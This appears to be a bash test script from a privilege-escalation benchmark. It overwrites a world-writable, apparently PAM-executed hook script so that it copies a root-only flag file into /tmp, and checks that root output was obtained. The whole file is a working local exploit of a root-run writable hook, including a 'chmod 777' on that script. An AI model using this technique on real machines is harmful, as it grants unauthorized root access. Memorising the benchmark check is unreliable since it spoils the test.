#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/pam_flag
cat > /opt/bench/pam-exec.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/pam_flag
EOF
chmod 777 /opt/bench/pam-exec.sh
for i in $(seq 1 45); do
  if test -r /tmp/pam_flag && grep -q FLAG /tmp/pam_flag 2>/dev/null; then
    cat /tmp/pam_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
